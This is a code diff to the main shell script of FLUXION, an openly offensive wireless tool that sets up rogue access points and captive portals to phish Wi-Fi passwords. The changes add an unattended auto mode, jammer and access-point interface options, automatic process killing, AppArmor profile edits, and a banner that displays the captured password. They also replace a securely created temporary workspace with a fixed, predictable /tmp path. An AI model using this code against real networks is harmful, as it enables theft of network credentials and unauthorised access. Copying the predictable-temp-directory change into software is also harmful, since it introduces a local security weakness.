@@ -4,34 +4,13 @@
 # ================== < FLUXION Parameters > ================== #
 # ============================================================ #
 # Path to directory containing the FLUXION executable script.
-readonly FLUXIONPath=$(dirname "$(readlink -f "$0")")
+readonly FLUXIONPath=$(dirname $(readlink -f "$0"))
 
 # Path to directory containing the FLUXION library (scripts).
 readonly FLUXIONLibPath="$FLUXIONPath/lib"
 
 # Path to the temp. directory available to FLUXION & subscripts.
-FLUXIONWorkspacePath=""
-
-fluxion_create_workspace() {
-  if [ "$FLUXIONWorkspacePath" ]; then return 0; fi
-
-  local workspace
-  workspace=$(mktemp -d -p /tmp fluxion.XXXXXX 2>/dev/null)
-  if [ ! "$workspace" ]; then
-    return 1
-  fi
-
-  # Set permissions to 755 so dhcpd and other services can access files
-  # (dhcpd drops privileges and needs to read config files)
-  if ! chmod 755 "$workspace" 2>/dev/null; then
-    rmdir "$workspace" 2>/dev/null
-    return 1
-  fi
-
-  FLUXIONWorkspacePath="$workspace"
-  readonly FLUXIONWorkspacePath
-}
-
+readonly FLUXIONWorkspacePath="/tmp/fluxspace"
 readonly FLUXIONIPTablesBackup="$FLUXIONPath/iptables-rules"
 
 # Path to FLUXION's preferences file, to be loaded afterward.
@@ -43,7 +22,7 @@ readonly FLUXIONNoiseFloor=-90
 readonly FLUXIONNoiseCeiling=-60
 
 readonly FLUXIONVersion=6
-readonly FLUXIONRevision=12
+readonly FLUXIONRevision=26
 
 # Declare window ration bigger = smaller windows
 FLUXIONWindowRatio=4
@@ -60,32 +39,55 @@ FLUXIONEnable5GHZ=0
 # ============================================================ #
 # ================= < Script Sanity Checks > ================= #
 # ============================================================ #
-if [ $EUID -ne 0 ]; then # Super User Check
-  printf "\033[31mAborted, please execute the script as root.\033[0m\n"; exit 1
+# Pre-parse flags that must run before root/X11 checks.
+FLUXIONPreParseTMux=""
+FLUXIONPreParseScanOnly=""
+FLUXIONPreParseListIfaces=""
+FLUXIONPreParseHelp=""
+for arg in "$@"; do
+  case "$arg" in
+    -m|--multiplexer) FLUXIONPreParseTMux=1;;
+    --scan-only) FLUXIONPreParseScanOnly=1;;
+    --list-interfaces) FLUXIONPreParseListIfaces=1;;
+    -h|--help|-v|--version) FLUXIONPreParseHelp=1;;
+  esac
+done
+
+if [ $EUID -ne 0 ] && [ ! "$FLUXIONPreParseHelp" ] && [ ! "$FLUXIONPreParseListIfaces" ]; then
+  echo -e "\\033[31mAborted, please execute the script as root.\\033[0m"; exit 1
 fi
 
-if ! fluxion_create_workspace; then
-  printf "\033[31mAborted, can't generate a secure workspace directory.\033[0m\n"; exit 6
-fi
+# Save original args for tmux re-exec.
+readonly FLUXIONOriginalArgs=$(printf '%q ' "$@")
 
-# ===================== < XTerm Checks > ===================== #
-# TODO: Run the checks below only if we're not using tmux.
-if [ ! "${DISPLAY:-}" ]; then # Assure display is available.
-  printf "\033[31mAborted, X (graphical) session unavailable.\033[0m\n"; exit 2
-fi
-
-if ! hash xdpyinfo 2>/dev/null; then # Assure display probe.
-  printf "\033[31mAborted, xdpyinfo is unavailable.\033[0m\n"; exit 3
-fi
-
-if ! xdpyinfo &>/dev/null; then # Assure display info available.
-  printf "\033[31mAborted, xterm test session failed.\033[0m\n"; exit 4
+# ===================== < Display Checks > ===================== #
+if [ "$FLUXIONPreParseScanOnly" ] || [ "$FLUXIONPreParseListIfaces" ] || [ "$FLUXIONPreParseHelp" ]; then
+  # These modes don't need a display at all.
+  :
+elif [ "$FLUXIONPreParseTMux" ]; then
+  # tmux mode: verify tmux is installed instead of X11.
+  if ! hash tmux 2>/dev/null; then
+    echo -e "\\033[31mAborted, tmux is not installed.\\033[0m"; exit 2
+  fi
+else
+  if [ ! "${DISPLAY:-}" ] || ! hash xdpyinfo 2>/dev/null || ! xdpyinfo &>/dev/null; then
+    # No usable X11 display — fall back to tmux mode automatically.
+    if ! hash tmux 2>/dev/null; then
+      echo -e "\\033[31mAborted, no display available and tmux is not installed.\\033[0m"; exit 2
+    fi
+    FLUXIONPreParseTMux=1
+  fi
 fi
 
 # ================ < Parameter Parser Check > ================ #
 getopt --test > /dev/null # Assure enhanced getopt (returns 4).
 if [ $? -ne 4 ]; then
   echo "\\033[31mAborted, enhanced getopt isn't available.\\033[0m"; exit 5
+fi
+
+# =============== < Working Directory Check > ================ #
+if ! mkdir -p "$FLUXIONWorkspacePath" &> /dev/null; then
+  echo "\\033[31mAborted, can't generate a workspace directory.\\033[0m"; exit 6
 fi
 
 # Once sanity check is passed, we can start to load everything.
@@ -101,6 +103,7 @@ source "$FLUXIONLibPath/ColorUtils.sh"
 source "$FLUXIONLibPath/IOUtils.sh"
 source "$FLUXIONLibPath/HashUtils.sh"
 source "$FLUXIONLibPath/HelpUtils.sh"
+source "$FLUXIONLibPath/WindowUtils.sh"
 
 # NOTE: These are configured after arguments are loaded (later).
 
@@ -109,7 +112,7 @@ source "$FLUXIONLibPath/HelpUtils.sh"
 # ============================================================ #
 if ! FLUXIONCLIArguments=$(
     getopt --options="vdk5rinmthb:e:c:l:a:r" \
-      --longoptions="debug,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies" \
+      --longoptions="debug,debug-log:,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,scan-time:,scan-only,list-interfaces,interface:,jammer-interface:,ap-interface:,tracker-interface:,ap-service:,timeout:,reg-domain:" \
       --name="FLUXION V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
   ); then
   echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
@@ -135,6 +138,7 @@ while [ "$1" != "" ] && [ "$1" != "--" ]; do
     -v|--version) echo "FLUXION V$FLUXIONVersion.$FLUXIONRevision"; exit;;
     -h|--help) fluxion_help; exit;;
     -d|--debug) readonly FLUXIONDebug=1;;
+    --debug-log) FLUXIONDebugLog="$2"; shift;;
     -k|--killer) readonly FLUXIONWIKillProcesses=1;;
     -5|--5ghz) FLUXIONEnable5GHZ=1;;
     -r|--reloader) readonly FLUXIONWIReloadDriver=1;;
@@ -150,10 +154,42 @@ while [ "$1" != "" ] && [ "$1" != "--" ]; do
     -i|--install) FLUXIONSkipDependencies=0; shift;;
     --ratio) FLUXIONWindowRatio=$2; shift;;
     --auto) readonly FLUXIONAuto=1;;
+    --scan-time) FLUXIONScanTime=$2; shift;;
+    --scan-only) readonly FLUXIONScanOnly=1;;
+    --list-interfaces) FLUXIONListInterfaces=1;;
+    --interface) FLUXIONInterface=$2; shift;;
     --skip-dependencies) readonly FLUXIONSkipDependencies=1;;
+    --jammer-interface) FLUXIONJammerInterface=$2; shift;;
+    --ap-interface) FLUXIONAPInterface=$2; shift;;
+    --tracker-interface) FLUXIONTrackerInterface=$2; shift;;
+    --ap-service) FLUXIONAPService=$2; shift;;
+    --timeout) FLUXIONTimeout=$2; shift;;
+    --reg-domain) FLUXIONRegDomain=${2^^}; shift;;
   esac
   shift # Shift new parameters
 done
+
+# Propagate no-display tmux fallback (set during pre-parse) into FLUXIONTMux.
+if [ "$FLUXIONPreParseTMux" ] && [ "$FLUXIONTMux" != "1" ]; then
+  readonly FLUXIONTMux=1
+fi
+
+# Default scan time for auto mode.
+if [ -z "$FLUXIONScanTime" ]; then
+  FLUXIONScanTime=30
+fi
+
+# Scan-only mode implies auto + killer.
+if [ "$FLUXIONScanOnly" ]; then
+  if [ "$FLUXIONAuto" != "1" ]; then
+    readonly FLUXIONAuto=1
+  fi
+fi
+
+# Auto mode implies killer mode (can't prompt user about interfering processes).
+if [ "$FLUXIONAuto" ] && [ "$FLUXIONWIKillProcesses" != "1" ]; then
+  readonly FLUXIONWIKillProcesses=1
+fi
 
 shift # Remove "--" to prepare for attacks to read parameters.
 # Executable arguments are handled after subroutine definition.
@@ -162,11 +198,13 @@ shift # Remove "--" to prepare for attacks to read parameters.
 # Load user-defined preferences if there's an executable script.
 # If no script exists, prepare one for the user to store config.
 # WARNING: Preferences file must assure no redeclared constants.
-if [ -x "$FLUXIONPreferencesFile" ]; then
-  source "$FLUXIONPreferencesFile"
-else
-  echo '#!/usr/bin/env bash' > "$FLUXIONPreferencesFile"
-  chmod u+x "$FLUXIONPreferencesFile"
+if [ $EUID -eq 0 ]; then
+  if [ -x "$FLUXIONPreferencesFile" ]; then
+    source "$FLUXIONPreferencesFile"
+  else
+    echo '#!/usr/bin/env bash' > "$FLUXIONPreferencesFile"
+    chmod u+x "$FLUXIONPreferencesFile"
+  fi
 fi
 
 # ================ < Configurable Constants > ================ #
@@ -191,14 +229,22 @@ if [ "$FLUXIONWIReloadDriver" != "1" ]; then # If defined, assure 1.
 fi
 
 # FLUXIONDebug [Normal Mode "" / Developer Mode 1]
-if [ "$FLUXIONDebug" ]; then
-  :> /tmp/fluxion.debug.log
-  readonly FLUXIONOutputDevice="/tmp/fluxion.debug.log"
+if [ $FLUXIONDebug ]; then
+  # Use custom debug log path if specified, otherwise default to /tmp
+  if [ -z "$FLUXIONDebugLog" ]; then
+    FLUXIONDebugLog="/tmp/fluxion.debug.log"
+  fi
+  :> "$FLUXIONDebugLog"
+  readonly FLUXIONOutputDevice="$FLUXIONDebugLog"
   readonly FLUXIONHoldXterm="-hold"
+  echo "Debug log: $FLUXIONDebugLog"
 else
   readonly FLUXIONOutputDevice=/dev/null
   readonly FLUXIONHoldXterm=""
 fi
+
+# Initialize window system (xterm or tmux).
+fluxion_window_init
 
 # ================ < Configurable Variables > ================ #
 readonly FLUXIONPromptDefault="$CRed[${CSBlu}fluxion$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
@@ -234,6 +280,33 @@ source "$FLUXIONPath/language/en.sh"
 # ============================================================ #
 # ================== < Startup & Shutdown > ================== #
 # ============================================================ #
+
+# Detect AppArmor-confined tools and add workspace access rules so fluxion
+# can use them with its own config/data files in FLUXIONWorkspacePath.
+# This is idempotent: rules already containing the workspace path are skipped.
+fluxion_configure_apparmor() {
+  # AppArmor must be present and manageable.
+  [ -d /sys/kernel/security/apparmor ] || return 0
+  [ -d /etc/apparmor.d/local ] || return 0
+  hash apparmor_parser 2>/dev/null || return 0
+
+  local changed=0
+
+  # dhcpd: needs read access to config file and rw+link access to leases file.
+  local dhcpdProfile="/etc/apparmor.d/usr.sbin.dhcpd"
+  local dhcpdLocal="/etc/apparmor.d/local/usr.sbin.dhcpd"
+  if [ -f "$dhcpdProfile" ] && ! grep -qF "$FLUXIONWorkspacePath" "$dhcpdLocal" 2>/dev/null; then
+    printf '# Allow fluxion workspace access (added by fluxion)\n%s/ r,\n%s/** rwl,\n' \
+      "$FLUXIONWorkspacePath" "$FLUXIONWorkspacePath" >> "$dhcpdLocal"
+    apparmor_parser -r "$dhcpdProfile" &>/dev/null
+    changed=1
+  fi
+
+  if [ "$changed" = "1" ]; then
+    echo -e "$FLUXIONVLine AppArmor profiles updated for fluxion workspace."
+  fi
+}
+
 fluxion_startup() {
   if [ "$FLUXIONDebug" ]; then return 1; fi
 
@@ -283,16 +356,18 @@ fluxion_startup() {
   echo -e "$FormatCenterLiterals"
 
   sleep 0.1
-  local -r fluxionDomain="raw.githubusercontent.com"
-  local -r fluxionPath="FluxionNetwork/fluxion/master/fluxion.sh"
-  local -r updateDomain="github.com"
-  local -r updatePath="FluxionNetwork/fluxion/archive/master.zip"
-  if installer_utils_check_update "https://$fluxionDomain/$fluxionPath" \
-    "FLUXIONVersion=" "FLUXIONRevision=" \
-    $FLUXIONVersion $FLUXIONRevision; then
-    if installer_utils_run_update "https://$updateDomain/$updatePath" \
-      "FLUXION-V$FLUXIONVersion.$FLUXIONRevision" "$FLUXIONPath"; then
-      fluxion_shutdown
+  if [ ! "$FLUXIONAuto" ]; then
+    local -r fluxionDomain="raw.githubusercontent.com"
+    local -r fluxionPath="FluxionNetwork/fluxion/master/fluxion.sh"
+    local -r updateDomain="github.com"
+    local -r updatePath="FluxionNetwork/fluxion/archive/master.zip"
+    if installer_utils_check_update "https://$fluxionDomain/$fluxionPath" \
+      "FLUXIONVersion=" "FLUXIONRevision=" \
+      $FLUXIONVersion $FLUXIONRevision; then
+      if installer_utils_run_update "https://$updateDomain/$updatePath" \
+        "FLUXION-V$FLUXIONVersion.$FLUXIONRevision" "$FLUXIONPath"; then
+        fluxion_shutdown
+      fi
     fi
   fi
 
@@ -300,18 +375,37 @@ fluxion_startup() {
 
   local requiredCLITools=(
     "aircrack-ng" "bc" "awk:awk|gawk|mawk"
-    "curl" "cowpatty" "dhcpd:isc-dhcp-server|dhcp" "7zr:p7zip" "hostapd" "lighttpd"
-    "iwconfig:wireless-tools" "macchanger" "mdk4" "dsniff" "mdk3" "nmap" "openssl"
-    "php-cgi" "xterm" "rfkill" "unzip" "route:net-tools"
+    "curl" "cowpatty" "dhcpd:isc-dhcp-server|dhcp-server|dhcp" "7zr:7zip-reduced|p7zip" "hostapd" "lighttpd"
+    "iw" "macchanger" "mdk4" "dsniff" "nmap" "openssl"
+    "php-cgi" "rfkill" "unzip" "route:net-tools"
     "fuser:psmisc" "killall:psmisc"
+    "iptables" "iptables-save:iptables" "iptables-restore:iptables"
   )
 
-    while ! installer_utils_check_dependencies "requiredCLITools"; do
-        if ! installer_utils_run_dependencies "InstallerUtilsCheckDependencies"; then
+  # Add display-mode-specific dependency.
+  if [ "$FLUXIONDisplayMode" = "tmux" ]; then
+    requiredCLITools+=("tmux")
+  else
+    requiredCLITools+=("xterm")
+  fi
+
+    local depRetryCount=0
+    while ! installer_utils_check_dependencies requiredCLITools[@]; do
+        if ! installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]; then
             echo
             echo -e "${CRed}Dependency installation failed!$CClr"
-            echo    "Press enter to retry, ctrl+c to exit..."
-            read -r bullshit
+            if [ "$FLUXIONAuto" ]; then
+                depRetryCount=$((depRetryCount + 1))
+                if [ $depRetryCount -ge 2 ]; then
+                    echo -e "${CRed}Auto mode: dependency install failed after retry, exiting.$CClr"
+                    exit 7
+                fi
+                echo "Auto mode: retrying dependency install..."
+                sleep 2
+            else
+                echo    "Press enter to retry, ctrl+c to exit..."
+                read -r bullshit
+            fi
         fi
     done
     if [ $FLUXIONMissingDependencies -eq 1 ]  && [ $FLUXIONSkipDependencies -eq 1 ];then
@@ -322,11 +416,23 @@ fluxion_startup() {
         exit 7
     fi
 
+  # lighttpd's package auto-enables the system service on install; disable it
+  # so it doesn't occupy port 80 or conflict with fluxion's own instance.
+  if hash lighttpd 2>/dev/null && hash systemctl 2>/dev/null; then
+    systemctl stop lighttpd &>/dev/null || true
+    systemctl disable lighttpd &>/dev/null || true
+  fi
+
+  fluxion_configure_apparmor
+
   echo -e "\\n\\n" # This echo is for spacing
 }
 
 fluxion_shutdown() {
-  if [ $FLUXIONDebug ]; then return 1; fi
+  # Clean up any tmux windows we created.
+  if type -t fluxion_window_cleanup &> /dev/null; then
+    fluxion_window_cleanup
+  fi
 
   # Show the header if the subroutine has already been loaded.
   if type -t fluxion_header &> /dev/null; then
@@ -356,9 +462,7 @@ fluxion_shutdown() {
     echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $FLUXIONKillingProcessNotice`"
     kill -s SIGKILL $targetPID &> $FLUXIONOutputDevice
   done
-  if [ -n "$authService" ]; then
-    kill -s SIGKILL $authService &> $FLUXIONOutputDevice
-  fi
+  kill -s SIGKILL $authService &> $FLUXIONOutputDevice
 
   # Assure changes are reverted if installer was activated.
   if [ "$PackageManagerCLT" ]; then
@@ -375,7 +479,7 @@ fluxion_shutdown() {
     for interface in "${!FluxionInterfaces[@]}"; do
       # Only deallocate fluxion or airmon-ng created interfaces.
       if [[ "$interface" == "flux"* || "$interface" == *"mon"* || "$interface" == "prism"* ]]; then
-        fluxion_deallocate_interface $interface
+        fluxion_deallocate_interface "$interface"
       fi
     done
   fi
@@ -384,6 +488,7 @@ fluxion_shutdown() {
   if [ -f "$FLUXIONIPTablesBackup" ]; then
     iptables-restore <"$FLUXIONIPTablesBackup" \
       &> $FLUXIONOutputDevice
+    rm -f "$FLUXIONIPTablesBackup"
   else
     iptables --flush
     iptables --table nat --flush
@@ -397,7 +502,6 @@ fluxion_shutdown() {
   if [ ! $FLUXIONDebug ]; then
     echo -e "$CWht[$CRed-$CWht] $FLUXIONDeletingFilesNotice$CClr"
     sandbox_remove_workfile "$FLUXIONWorkspacePath/*"
-    rmdir "$FLUXIONWorkspacePath" &> $FLUXIONOutputDevice
   fi
 
   if [ $FLUXIONWIKillProcesses ]; then
@@ -472,12 +576,13 @@ fluxion_conditional_bail() {
     fluxion_handle_exit
     return 1
   fi
+  if [ "$FLUXIONAuto" ]; then return 0; fi
   echo "Press any key to continue execution..."
   read -r bullshit
 }
 
 # ERROR Report only in Developer Mode
-if [ "$FLUXIONDebug" ]; then
+if [ $FLUXIONDebug ]; then
   fluxion_error_report() {
     echo "Exception caught @ line #$1"
   }
@@ -500,9 +605,49 @@ fluxion_handle_abort_attack() {
 trap fluxion_handle_abort_attack SIGABRT
 
 fluxion_handle_exit() {
+  # Read success state NOW, before fluxion_handle_abort_attack or
+  # fluxion_shutdown touch the workspace. Note: fluxion_shutdown calls
+  # exit 0 itself so nothing after it ever runs.
+  local _successPassword=""
+  local _successSSID="$FluxionTargetSSID"
+  local _successMAC="$FluxionTargetMAC"
+  if [ -f "$FLUXIONWorkspacePath/status.txt" ] && \
+     [ -f "$FLUXIONWorkspacePath/candidate.txt" ]; then
+    _successPassword=$(cat "$FLUXIONWorkspacePath/candidate.txt" 2>/dev/null)
+  fi
+
   fluxion_handle_abort_attack
+
+  # Show success banner BEFORE fluxion_shutdown clears the screen and exits.
+  if [ -n "$_successPassword" ]; then
+    local _logFile=""
+    if [ -n "${CaptivePortalNetLog:-}" ]; then
+      _logFile=$(ls -t "$CaptivePortalNetLog"/*"$_successMAC"* 2>/dev/null | head -1)
+    fi
+
+    tput cnorm 2>/dev/null
+    clear
+    echo
+    echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+    echo -e "  ${CSGrn}|           ATTACK SUCCESSFUL                   |${CClr}"
+    echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+    echo -e "  ${CGrn}  Network  :${CClr} ${CSWht}$_successSSID${CClr}"
+    echo -e "  ${CGrn}  BSSID    :${CClr} ${CSWht}$_successMAC${CClr}"
+    echo -e "  ${CYel}  Password :${CClr} ${CSYel}$_successPassword${CClr}"
+    if [ -n "$_logFile" ]; then
+      echo -e "  ${CGrn}  Log      :${CClr} ${CSWht}$_logFile${CClr}"
+    fi
+    echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+    echo
+    if [ -z "${FLUXIONAuto:-}" ]; then
+      read -rp "  Press Enter to clean up and exit... " _
+      echo
+    else
+      sleep 10
+    fi
+  fi
+
   fluxion_shutdown
-  exit 1
 }
 
 # In case of unexpected termination, run fluxion_shutdown.
@@ -513,7 +658,7 @@ fluxion_handle_target_change() {
   echo "Target change signal received!" > $FLUXIONOutputDevice
 
   local targetInfo
-  readarray -t targetInfo < <(more "$FLUXIONWorkspacePath/target_info.txt")
+  readarray -t targetInfo < "$FLUXIONWorkspacePath/target_info.txt"
 
   FluxionTargetMAC=${targetInfo[0]}
   FluxionTargetSSID=${targetInfo[1]}
@@ -537,19 +682,46 @@ fluxion_handle_target_change() {
     fluxion_conditional_bail "Target tracker failed to prep attack."
   fi
 
-  if ! fluxion_run_attack; then
-    fluxion_conditional_bail "Target tracker failed to start attack."
-  fi
+  # Restart attack services and tracker without blocking on user input.
+  # NOTE: Do NOT call fluxion_run_attack here as it blocks on io_query_choice.
+  start_attack
+  fluxion_target_tracker_start
 }
 
 # If target monitoring enabled, act on changes.
 trap fluxion_handle_target_change SIGALRM
+
+fluxion_handle_target_absent() {
+  echo "Target absent signal received." > $FLUXIONOutputDevice
+  if [ "$(type -t pause_attack)" = "function" ]; then
+    pause_attack &> $FLUXIONOutputDevice
+  fi
+}
+
+fluxion_handle_target_present() {
+  echo "Target present signal received." > $FLUXIONOutputDevice
+  if [ "$(type -t resume_attack)" = "function" ]; then
+    resume_attack &> $FLUXIONOutputDevice
+  fi
+}
+
+trap fluxion_handle_target_absent SIGUSR1
+trap fluxion_handle_target_present SIGUSR2
 
 
 # ============================================================ #
 # =============== < Resolution & Positioning > =============== #
 # ============================================================ #
 fluxion_set_resolution() { # Windows + Resolution
+
+  # In tmux/headless mode, geometry variables are unused; skip X11 resolution detection.
+  if [ "$FLUXIONDisplayMode" = "tmux" ] || [ "$FLUXIONDisplayMode" = "headless" ]; then
+    TOPLEFT="" ; TOPRIGHT="" ; TOP=""
+    BOTTOMLEFT="" ; BOTTOMRIGHT="" ; BOTTOM=""
+    LEFT="" ; RIGHT=""
+    TOPLEFTBIG="" ; TOPRIGHTBIG=""
+    return 0
+  fi
 
   # Get dimensions
   # Verify this works on Kali before commiting.
@@ -618,11 +790,15 @@ fluxion_do() {
   local -r __fluxion_do__namespace=$1
   local -r __fluxion_do__identifier=$2
 
+  echo ">>> CALLING: ${__fluxion_do__namespace}_$__fluxion_do__identifier" >> "$FLUXIONOutputDevice"
   # Notice, the instruction will be adde to the Do Log
   # regardless of whether it succeeded or failed to execute.
   eval FXDLog_$__fluxion_do__namespace+=\("$__fluxion_do__identifier"\)
+  echo ">>> ABOUT TO EVAL: ${__fluxion_do__namespace}_$__fluxion_do__identifier" >> "$FLUXIONOutputDevice"
   eval ${__fluxion_do__namespace}_$__fluxion_do__identifier "${@:3}"
-  return $?
+  local result=$?
+  echo ">>> RESULT: $result" >> "$FLUXIONOutputDevice"
+  return $result
 }
 
 fluxion_undo() {
@@ -704,7 +880,9 @@ fluxion_do_sequence() {
   # Start sequence with the first instruction available.
   local __fluxion_do_sequence__instructionIndex=0
   local __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[0]}
+  echo "SEQUENCE: ${__fluxion_do_sequence__sequence[@]}" >> "$FLUXIONOutputDevice"
   while [ "$__fluxion_do_sequence__instruction" ]; do
+    echo "INDEX=$__fluxion_do_sequence__instructionIndex INSTRUCTION=$__fluxion_do_sequence__instruction" >> "$FLUXIONOutputDevice"
     if ! fluxion_do $__fluxion_do_sequence__namespace $__fluxion_do_sequence__instruction; then
       if ! fluxion_undo $__fluxion_do_sequence__namespace; then
         return -2
@@ -726,7 +904,7 @@ fluxion_do_sequence() {
 
     __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[$__fluxion_do_sequence__instructionIndex]}
     echo "Running next: $__fluxion_do_sequence__instruction" \
-      > $FLUXIONOutputDevice
+      >> $FLUXIONOutputDevice
   done
 }
 
@@ -763,24 +941,39 @@ fluxion_unset_language() {
 
 fluxion_set_language() {
   if [ ! "$FluxionLanguage" ]; then
-    # Get all languages available.
-    local languageCodes
-    readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')
+    if [ "$FLUXIONAuto" ]; then
+      FluxionLanguage="en"
+    else
+      # Get all languages available.
+      local languageCodes
+      readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')
 
-    local languages
-    readarray -t languages < <(
-      head -n 3 language/*.sh |
-      grep -E "^# native: " |
-      sed -E 's/# \w+: //'
-    )
+      local languages
+      readarray -t languages < <(
+        head -n 3 language/*.sh |
+        grep -E "^# native: " |
+        sed -E 's/# \w+: //'
+      )
 
-    io_query_format_fields "$FLUXIONVLine Select your language" \
-      "\t$CRed[$CSYel%d$CClr$CRed]$CClr %s / %s\n" \
-      languageCodes[@] languages[@]
+      # Prepare choices array for io_query_choice
+      local choices=()
+      for i in "${!languageCodes[@]}"; do
+        choices+=("${languageCodes[i]} / ${languages[i]}")
+      done
+      choices+=("Exit")
 
-    FluxionLanguage=${IOQueryFormatFields[0]}
+      io_query_choice "$FLUXIONVLine Select your language" choices[@]
 
-    echo # Do not remove.
+      # Handle exit selection
+      if [ "$IOQueryChoice" = "Exit" ]; then
+        fluxion_handle_exit
+      fi
+
+      # Extract language code from selection (format: "code / name")
+      FluxionLanguage=$(echo "$IOQueryChoice" | cut -d ' ' -f 1)
+
+      echo # Do not remove.
+    fi
   fi
 
   # Check if all language files are present for the selected language.
@@ -814,7 +1007,8 @@ fluxion_set_language() {
 declare -A FluxionInterfaces=() # Global interfaces' registry.
 
 fluxion_deallocate_interface() { # Release interfaces
-  if [ ! "$1" ] || ! interface_is_real $1; then return 1; fi
+  if [ ! "$1" ]; then return 1; fi
+  if ! interface_is_real "$1"; then return 1; fi
 
   local -r oldIdentifier=$1
   local -r newIdentifier=${FluxionInterfaces[$oldIdentifier]}
@@ -859,16 +1053,25 @@ fluxion_deallocate_interface() { # Release interfaces
 # Return 4: Fluxion failed to reidentify interface.
 # Return 5: Interface allocation failed (identifier missing).
 fluxion_allocate_interface() { # Reserve interfaces
-  if [ ! "$1" ]; then return 1; fi
+  if [ ! "$1" ]; then
+    echo "Allocation failed: no identifier" >> "$FLUXIONOutputDevice"
+    return 1
+  fi
 
   local -r identifier=$1
+  echo "=== ALLOCATE: $identifier ===" >> "$FLUXIONOutputDevice"
+  echo "FluxionInterfaces[$identifier] = '${FluxionInterfaces[$identifier]}'" >> "$FLUXIONOutputDevice"
 
   # If the interface is already in allocation table, we're done.
   if [ "${FluxionInterfaces[$identifier]+x}" ]; then
+    echo "Interface already allocated: $identifier -> ${FluxionInterfaces[$identifier]}" >> "$FLUXIONOutputDevice"
     return 0
   fi
 
-  if ! interface_is_real $identifier; then return 2; fi
+  if ! interface_is_real $identifier; then
+    echo "Interface not real: $identifier" >> "$FLUXIONOutputDevice"
+    return 2
+  fi
 
 
   local interfaceIdentifier=$identifier
@@ -917,7 +1120,7 @@ fluxion_allocate_interface() { # Reserve interfaces
       # TODO: Make the loop below airmon-ng independent.
       # Maybe replace it with a list of network-managers?
       # WARNING: Version differences could break code below.
-      for program in "$(airmon-ng check | awk 'NR>6{print $2}')"; do
+      for program in "$(timeout 5 airmon-ng check 2>/dev/null | awk 'NR>6{print $2}')"; do
         killall "$program" &> $FLUXIONOutputDevice
       done
     fi
@@ -954,8 +1157,9 @@ fluxion_allocate_interface() { # Reserve interfaces
     fi
 
     interface_reidentify $identifier $FluxionNextAssignableInterface
+    local reidentify_result=$?
 
-    if [ $? -ne 0 ]; then # If reidentifying failed, abort immediately.
+    if [ $reidentify_result -ne 0 ]; then # If reidentifying failed, abort immediately.
       return 4
     fi
   fi
@@ -1013,10 +1217,10 @@ fluxion_allocate_interface() { # Reserve interfaces
 # Description: Prints next available assignable interface name.
 # ------------------------------------------------------------ #
 fluxion_next_assignable_interface() {
-  # Find next available interface by checking global.
+  # Find next available interface by checking global hash AND physical interfaces
   local -r prefix=$1
   local index=0
-  while [ "${FluxionInterfaces[$prefix$index]}" ]; do
+  while [ "${FluxionInterfaces[$prefix$index]}" ] || interface_physical "$prefix$index"; do
     let index++
   done
   FluxionNextAssignableInterface="$prefix$index"
@@ -1036,11 +1240,48 @@ fluxion_get_interface() {
     local -r interfaceQuery=$FLUXIONInterfaceQuery
   fi
 
+  # Auto mode: select first available interface (or --interface if specified).
+  if [ "$FLUXIONAuto" ]; then
+    # Use --interface hint only if it isn't already allocated.
+    if [ "$FLUXIONInterface" ] && interface_is_wireless "$FLUXIONInterface" \
+      && [ -z "${FluxionInterfaces[$FLUXIONInterface]+x}" ]; then
+      FluxionInterfaceSelected="$FLUXIONInterface"
+      interface_chipset "$FLUXIONInterface" 2>/dev/null
+      interface_bands "$FLUXIONInterface" 2>/dev/null
+      local __autoBandTag=""
+      if [ "$InterfaceBands" ] && [ "$InterfaceBands" != "unknown" ]; then __autoBandTag="[$InterfaceBands] "; fi
+      FluxionInterfaceSelectedInfo="${__autoBandTag}${InterfaceChipset:-}"
+      FluxionInterfaceSelectedState="[+]"
+      return 0
+    fi
+    local autoInterfaces
+    readarray -t autoInterfaces < <($1)
+    local autoIface
+    for autoIface in "${autoInterfaces[@]}"; do
+      # Skip interfaces already in use (allocated or renamed).
+      if [ "$autoIface" ] \
+        && [ -z "${FluxionInterfaces[$autoIface]+x}" ]; then
+        FluxionInterfaceSelected="$autoIface"
+        interface_chipset "$autoIface" 2>/dev/null
+        interface_bands "$autoIface" 2>/dev/null
+        local __autoBandTag2=""
+        if [ "$InterfaceBands" ] && [ "$InterfaceBands" != "unknown" ]; then __autoBandTag2="[$InterfaceBands] "; fi
+        FluxionInterfaceSelectedInfo="${__autoBandTag2}${InterfaceChipset:-}"
+        FluxionInterfaceSelectedState="[+]"
+        return 0
+      fi
+    done
+    echo "Auto mode: no interfaces available." > $FLUXIONOutputDevice
+    return 1
+  fi
+
   while true; do
     local candidateInterfaces
     readarray -t candidateInterfaces < <($1)
     local interfacesAvailable=()
     local interfacesAvailableInfo=()
+    local interfacesAvailableBands=()
+    local interfacesAvailableBus=()
     local interfacesAvailableColor=()
     local interfacesAvailableState=()
 
@@ -1053,12 +1294,25 @@ fluxion_get_interface() {
       fi
 
       interface_chipset "$candidateInterface"
+      interface_bands "$candidateInterface" 2>/dev/null
+      if [ "$InterfaceBands" ] && [ "$InterfaceBands" != "unknown" ]; then
+        interfacesAvailableBands+=("[$InterfaceBands]")
+      else
+        interfacesAvailableBands+=("")
+      fi
+      if [ "$InterfaceHardwareBus" ]; then
+        interfacesAvailableBus+=("[$InterfaceHardwareBus]")
+      else
+        interfacesAvailableBus+=("")
+      fi
       interfacesAvailableInfo+=("$InterfaceChipset")
 
       # If it has already been allocated, we can use it at will.
       local candidateInterfaceAlt=${FluxionInterfaces["$candidateInterface"]}
       if [ "$candidateInterfaceAlt" ]; then
-        interfacesAvailable+=("$candidateInterfaceAlt")
+        # The candidate is already allocated. Show it regardless of whether
+        # it's the original or renamed interface. User will select by what they see.
